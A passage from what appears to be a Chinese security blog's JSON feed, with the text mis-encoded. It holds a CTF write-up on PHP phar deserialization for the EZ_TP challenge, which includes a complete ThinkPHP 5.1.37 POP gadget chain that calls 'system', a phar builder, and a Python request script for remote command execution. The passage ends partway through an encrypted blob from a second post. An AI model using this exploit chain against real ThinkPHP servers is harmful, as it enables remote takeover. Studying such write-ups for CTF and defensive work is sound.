href=\"https://www.php.net/manual/zh/phar.converttoexecutable.php\">https://www.php.net/manual/zh/phar.converttoexecutable.php</a></p>\n<p>å¯¹åº”çš„ä»£ç ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$phar</span> = <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">convertToExecutable</span>(<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">TAR</span>,<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">BZ2</span>);<span class=\"comment\">//ä¼šç”Ÿæˆxxxx.phar.tar.bz2</span></span><br><span class=\"line\"><span class=\"variable\">$phar</span> = <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">convertToExecutable</span>(<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">TAR</span>,<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">GZ</span>);<span class=\"comment\">//ä¼šç”Ÿæˆxxxx.phar.tar.gz</span></span><br><span class=\"line\"><span class=\"variable\">$phar</span> = <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">convertToExecutable</span>(<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">ZIP</span>);<span class=\"comment\">//ä¼šç”Ÿæˆxxxx.phar.zip</span></span><br></pre></td></tr></table></figure>\n\n<hr>\n<h3 id=\"POPé“¾\"><a href=\"#POPé“¾\" class=\"headerlink\" title=\"POPé“¾\"></a><strong>POPé“¾</strong></h3><p>POP(property oriented programming)ï¼Œè¯´ç™½äº†å°±æ˜¯ç»è¿‡ä¸€è¿ä¸²çš„é­”æœ¯æ–¹æ³•&#x2F;ç‰¹æ®Šæ–¹æ³•è°ƒç”¨è¾¾åˆ°ç‰¹å®šç›®çš„çš„ä¸€ç§æ”»å‡»æ–¹å¼ï¼Œæœ¬è´¨æ˜¯é€šè¿‡åœ¨è°ƒç”¨è¿™äº›æ–¹æ³•çš„è¿‡ç¨‹ä¸­åˆè§¦å‘äº†åˆ«çš„ç‰¹æ®Šæ–¹æ³•ï¼Œå¼•å‘è¿é”ååº”ç›´åˆ°è§¦åŠç›®æ ‡ã€‚pharååºåˆ—åŒ–ä½¿å¾—ä¸å­˜åœ¨unserilizeå‡½æ•°æ—¶è¿™æ ·çš„æ”»å‡»ä¹Ÿèƒ½æˆåŠŸï¼Œè¿™æ­£æ˜¯æ‰€è°“â€œæ‰©å¤§æ”»å‡»é¢â€ã€‚æˆ‘ä»¬ä»¥åˆšåˆšç»“æŸçš„å®‰æ´µæ¯2021 EZ_TPä¸ºä¾‹å­ã€‚</p>\n<p>ç½‘ç«™ä½¿ç”¨ThinkPHP V5.1.37ï¼Œç½‘ä¸Šå·²æœ‰ç°æˆçš„<a href=\"https://blog.csdn.net/lllffg/article/details/116145918\">POPé“¾</a>ï¼Œç°åœ¨éœ€è¦æˆ‘ä»¬åœ¨æ²¡æœ‰unserilizeå‡½æ•°çš„æƒ…å†µä¸‹å®Œæˆååºåˆ—åŒ–æ”»å‡»ã€‚</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">app</span>\\<span class=\"title class_\">index</span>\\<span class=\"title class_\">controller</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">think</span>\\<span class=\"title\">Controller</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Index</span> <span class=\"keyword\">extends</span> <span class=\"title\">controller</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">index</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;12è½½åˆå¿ƒä¸æ”¹ï¼ˆ2006-2018ï¼‰ - ä½ å€¼å¾—ä¿¡èµ–çš„PHPæ¡†æ¶&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hello</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">        <span class=\"variable\">$hello</span> = <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"string\">&#x27;Welcome to D0g3&#x27;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;hello&#x27;</span>])||<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;hello&#x27;</span>])) <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;world&#x27;</span>]))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">parse_str</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;world&#x27;</span>],<span class=\"variable\">$haha</span>);</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">extract</span>(<span class=\"variable\">$haha</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$a</span> = <span class=\"string\">&#x27;hello.txt&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$s</span> = <span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$hello</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"string\">&#x27;hello.txt&#x27;</span>, <span class=\"variable\">$s</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> (<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>parse_str()å’Œextract()ä½¿å¾—æˆ‘ä»¬å¯ä»¥é€šè¿‡å˜é‡è¦†ç›–å®Œæˆæ–‡ä»¶å†™å…¥ä¸ä»»æ„è¯»å–ï¼Œå¹¶ä¸”$aå¯ä»¥ä½¿ç”¨ä¼ªåè®®ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥çš„äº‹æƒ…å°±ç†æ‰€åº”å½“äº†ï¼šå¾€hello.txté‡Œå†™å…¥ä¸€ä¸ªpharï¼Œmetadataé‡Œé¢æ”¾ThinkPHP 5.1.37 çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œå®ŒæˆRCE.(å…³äºè¿™ä¸ªPOPé“¾çš„åŸç†è¯·å‚é˜…<a href=\"https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.1.37-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html\">https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-ååºåˆ—åŒ–æ¼æ´/Thinkphp-5.1.37-ååºåˆ—åŒ–æ¼æ´.html</a> è®²çš„å¾ˆè¯¦ç»†)</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">abstract</span> <span class=\"title class_\">class</span> <span class=\"title class_\">Model</span>&#123;</span><br><span class=\"line\">        <span class=\"title class_\">protected</span> $<span class=\"title class_\">append</span> = [];</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$data</span> = [];</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;append = [<span class=\"string\">&quot;ethan&quot;</span>=&gt;[<span class=\"string\">&quot;godspeedyyds&quot;</span>,<span class=\"string\">&quot;xtxyyds&quot;</span>]];</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;data = [<span class=\"string\">&quot;ethan&quot;</span>=&gt;<span class=\"keyword\">new</span> <span class=\"title class_\">Request</span>()];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Request</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$hook</span> = [];</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$filter</span> = <span class=\"string\">&quot;system&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$config</span> = [</span><br><span class=\"line\">            <span class=\"string\">&#x27;var_method&#x27;</span>       =&gt; <span class=\"string\">&#x27;_method&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;var_ajax&#x27;</span>         =&gt; <span class=\"string\">&#x27;_ajax&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;var_pjax&#x27;</span>         =&gt; <span class=\"string\">&#x27;_pjax&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class=\"string\">&#x27;s&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [</span><br><span class=\"line\">                <span class=\"string\">&#x27;ORIG_PATH_INFO&#x27;</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;REDIRECT_PATH_INFO&#x27;</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;REDIRECT_URL&#x27;</span></span><br><span class=\"line\">            ],</span><br><span class=\"line\">            <span class=\"string\">&#x27;default_filter&#x27;</span>   =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;url_domain_root&#x27;</span>  =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;https_agent_name&#x27;</span> =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class=\"string\">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class=\"string\">&#x27;html&#x27;</span>,</span><br><span class=\"line\">        ];</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$param</span> = [<span class=\"string\">&#x27;cat /y0u_f0und_It&#x27;</span>];</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;filter = <span class=\"string\">&quot;system&quot;</span>;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;config = [<span class=\"string\">&quot;var_ajax&quot;</span>=&gt;<span class=\"string\">&#x27;&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;hook = [<span class=\"string\">&quot;visible&quot;</span>=&gt;[<span class=\"variable language_\">$this</span>,<span class=\"string\">&quot;isAjax&quot;</span>]];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">process</span>\\<span class=\"title class_\">pipes</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">model</span>\\<span class=\"title class_\">concern</span>\\<span class=\"title class_\">Conversion</span>;</span><br><span class=\"line\">    <span class=\"keyword\">use</span> <span class=\"title\">think</span>\\<span class=\"title\">model</span>\\<span class=\"title\">Pivot</span>;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Windows</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$files</span> = [];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;files = [<span class=\"keyword\">new</span> <span class=\"title class_\">Pivot</span>()];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">model</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">Model</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Pivot</span> <span class=\"keyword\">extends</span> <span class=\"title\">Model</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">process</span>\\<span class=\"title class_\">pipes</span>\\<span class=\"title class_\">Windows</span>;</span><br><span class=\"line\">    <span class=\"variable\">$w</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Windows</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$p</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Phar</span>(<span class=\"string\">&#x27;phar.phar&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$p</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>();</span><br><span class=\"line\">    <span class=\"variable\">$p</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$p</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$w</span>);</span><br><span class=\"line\">    <span class=\"variable\">$p</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;test&quot;</span>, <span class=\"string\">&quot;12345&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$p</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>æ‰§è¡Œåç”Ÿæˆpharï¼Œç„¶åæ‰§è¡Œè„šæœ¬</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.parse</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;phar.phar&#x27;</span>,<span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    s = f.read()</span><br><span class=\"line\"></span><br><span class=\"line\">s = urllib.parse.quote(base64.b64encode(s).decode())</span><br><span class=\"line\"><span class=\"comment\"># print(s)</span></span><br><span class=\"line\">remote = <span class=\"string\">&#x27;&lt;here_is_remote_ip&gt;&#x27;</span></span><br><span class=\"line\">sess =requests.session()</span><br><span class=\"line\">r = sess.post(</span><br><span class=\"line\">    url = <span class=\"string\">f&#x27;http://<span class=\"subst\">&#123;remote&#125;</span>/index.php/index/index/hello&#x27;</span>,</span><br><span class=\"line\">    params=&#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;ethan&#x27;</span>:<span class=\"string\">&#x27;&lt;here_is_your_shell_command&gt;&#x27;</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    data = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;world&#x27;</span>:<span class=\"string\">f&#x27;hello=<span class=\"subst\">&#123;s&#125;</span>&amp;a=phar://./hello.txt&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.text)</span><br></pre></td></tr></table></figure>\n\n<p>æˆåŠŸRCE</p>\n<hr>\n<h2 id=\"æ€»ç»“\"><a href=\"#æ€»ç»“\" class=\"headerlink\" title=\"æ€»ç»“\"></a>æ€»ç»“</h2><p>pharååºåˆ—åŒ–æä¾›äº†ä¸€ç§æ‰©å±•ååºåˆ—åŒ–æ¼æ´æ”»å‡»é¢çš„æ–¹å¼ã€å…¥å£ï¼Œæ‰€ä»¥åŸºäºunserialize()å‡½æ•°çš„å„ç±»æ”»å‡»tricksï¼ˆæ¯”å¦‚å¼•ç”¨ç»•è¿‡ä¹‹ç±»çš„ï¼‰ä¾ç„¶é€‚ç”¨ã€‚é‰´äºpharååºåˆ—åŒ–æ¼æ´è®¾è®¡ç‰ˆæœ¬è¾ƒå¤šï¼Œç›¸ä¿¡CTFæ¯”èµ›ä¸­å®ƒä»ç„¶ä¼šç¨³å®šå‡ºåœºã€‚</p>\n<hr>\n<p>å‚è€ƒèµ„æ–™ï¼š</p>\n<p><a href=\"https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.1.37-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html\">Thinkphp-5.1.37-ååºåˆ—åŒ–æ¼æ´</a></p>\n<p><a href=\"https://www.php.net/manual/zh/class.phar.php\">https://www.php.net/manual/zh/class.phar.php</a></p>\n<p><a href=\"https://blog.csdn.net/lllffg/article/details/116145918\">Thinkphp 5.1.37ååºåˆ—åŒ–æ¼æ´</a></p>\n<p><a href=\"https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf\">us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It</a></p>\n<p><a href=\"https://github.dev/php/php-src\">https://github.dev/php/php-src</a></p>\n<p><a href=\"https://www.webhek.com/post/packaging-your-php-apps-with-phar.html\">packaging-your-php-apps-with-phar</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/205943.html\">PHARååºåˆ—åŒ–æ‹“å±•æ“ä½œæ€»ç»“</a></p>\n",
            "tags": [
                "Phar",
                "ååºåˆ—åŒ–",
                "PHP"
            ]
        },
        {
            "id": "http://cubicy.icu/2021/11/09/WriteUp%20%E6%97%A5%E5%93%ADschool-bus%20%E4%B8%8A%E4%BA%86%E9%82%A3%E4%B8%AAwriteup/",
            "url": "http://cubicy.icu/2021/11/09/WriteUp%20%E6%97%A5%E5%93%ADschool-bus%20%E4%B8%8A%E4%BA%86%E9%82%A3%E4%B8%AAwriteup/",
            "title": "WriteUp æ—¥å“­school-bus ä¸Šäº†é‚£ä¸ªwriteup",
            "date_published": "2021-11-09T03:08:00.000Z",
            "content_html": "<p>å¯†é’¥è¯·æ‰¾æœ¬äººç´¢å–^_^<br>AES CBC Zero padding 128bits&#x2F;block IV&#x3D;0  UTF-8<br>qboAHUOHL+uw94b2elojCJWHWKwqPtIwFzSDKPZqmHPSu0APpp7H0ibcQNIUgrwDCCwdydqP+T74+slwNh6PM4GTvT1CoF2thGIZi5yCS9HfleGi5hP58rxFM3HzQxaU9EcxOEYbtGObactrCOzKP&#x2F;+tPittHwWWiL5uEQyt8ESrZlgr19O5mtM4zrkRoODCUtcna5XWuatk94T60ToF6ZrhqTb5v60dcwGjw3Zf1xaBRvYR2HltlogOzs&#x2F;QoLrDm&#x2F;gzGqxvddGPCaOEkF5nCzk4un7sl6RJD77GVxRA4IqYMSExrw&#x2F;By3bqLJyL+3waQihC4E3teqyknbLGbYCtF5VKV32WmE8H0hEyP0KkpO6MTJBiz4mziI3M0+pmoTXIRiBSpISAGq7RbKMIs2cOFD7Baxx+vUXuCShr7ZExYTi3bHD3r435&#x2F;F4WXA9NuFaNM5Lhu+rmFBRobYZ2Ur3BBIFDlTT6gI5XXgoVj9qhHx5DJWFlGcglkgefiabVxUmTFFohZPLnpJxGJByTi6Frw+epqfZkrY0eGTMPIBKcwQDqh1DnPDyxm+64Xr5fffzpmG&#x2F;HNyq8Nsa1qpk8Yw+Vu4l03oDZ9CX0msubse852dj0ySNKgYXSOKnYet8jdjSC2eVd14nypMuok1BPUoHMv4rlme813n&#x2F;lE8LehT5xRF8R+HFyxfsRb354Xr39YX5DpI61tS41P1A+IiXbWvGG7kUk7Ln4mV+UJe6FEWzNzD5f0o3thGCoYd7ccyUrVJTbFsnbz7wuCmWS9dFkx3QAOxkGcbgyPh9NtbkcfKYa&#x2F;znW6GibzQf3NQZ2W4jQl&#x2F;wEtVPMs1BzweyAI3XGoJy7ZdHrvrswzdSq9rrcJLYW8TLG4lCowCRwb0gx1d9RptT4Tnj15poEl3zW66+L9dSb6RxTgsWrh0MM20xHmLmAEkoVG5QtGpZjQUIiKrq2BDahZtKWQayM1c+x8PtdZysfGYxyW+nzq&#x2F;frGKmEKwo8GMqiLwevXk1aLryVVf57ofS56w+cyYAwmJtJ3ZKyeV26k4+WkV7EHBrTbItrz8EG8uP1eTzz922bAOhdWVck80iAc2QeolUYa6Ohp4GPP0tN2Q+CtBuPgjaPERjt42ZfhmstjJ9OoOiFObtUH72Rvg0i8aK+NsaSM48jxxuCJ8atXf57uu6giunfmaGaQ8fbdd395Sq7mTbvUiTVEn9tQX23xYfKcpnHSPMGfdcmeL5LdYg153QHLRLJ79&#x2F;vFbTKt6iLLbcImzlNgs70xE78rKHG3YFrrGwd41&#x2F;DSOxLqHYE5tiHkb32Haoy+&#x2F;d6NAAzahYrhx2x28DVDmJbotGIEjpCw4hvWSwAkT3toy0aRE5XpVpzzqXqxaSTteM+Vifzr&#x2F;+zynUM7SUwbMvONbqyhqC6tKtYtEOFoknu80e20Id7Ja9nfWH8s0Z7iWeb0p&#x2F;8i5yHvZVuuYFnDkcOz1z7VGmi6B7W2KTp9BWcjTupzxH+pnoGV+hMUHFiBoYrZJzt5bFpvOzEYJDHhq4oh8jxZMeKADJBwDfoNFaBeN2tVS93HJ1tT18YwI4BsxiDjBuX351JfepxVrP0d0DNlT&#x2F;rYgCyeXzIiz244JReySuLe6mALcEg0htTn7oZt6yONG1LVq8mfQ6GXrSqIaeBbNrfP3FF7C+7Vri45CvV39Rnt9y2r3eKdOW2VGf+8XZ8JBWKwpT65u1lKxim+FDxxmqxY1nStKtm3v6K5FtcsBz3LmNBJPB9oaILV10XWIPVVOpgD4MwV4XFT&#x2F;vpgoVhL0Det0atbj1KBG8A0dhLZwcWx72l&#x2F;yuAoCLuMoXciNPsVmngkkuCFVEziPxgPqVfPQTbGQbk4raRfOkCbkK5nAS4MTeEfr61fvQwYVXPYRTXDx1DWbTUABHbG0e5f8OG7fKNpC8c8m94sZM6osTLAdus73OC5Lj&#x2F;iHsOYgjfkW1KRnL7W5b2UOdNgUVyQueSNBmQEw4sW9J5+LWYd4NRE0qL8TLrjhL26u6L6RBVMEJomjcAQnOBGIiBVl4jSAgt1HcpnDn7JyV95Th5pPEJ7YGtgLkBkuvIpiIW9sGLwWJsWkJwQXyFTSxMaJeaxyz6q725nxYXrIXIq7uGUJrDaN60GNnwgL&#x2F;swzqqlmF0gdorXScCHc06roB+27rYV3kEEguhmsyoyxHdX4J33BEXeqigi3JaTrsVafApgIKZYhN&#x2F;uH5UKHgZ4Xr8Qq&#x2F;aTVcnv8ovm6jwTZRnQFCZaPKQ995TL5Rfm8gF4ejv32i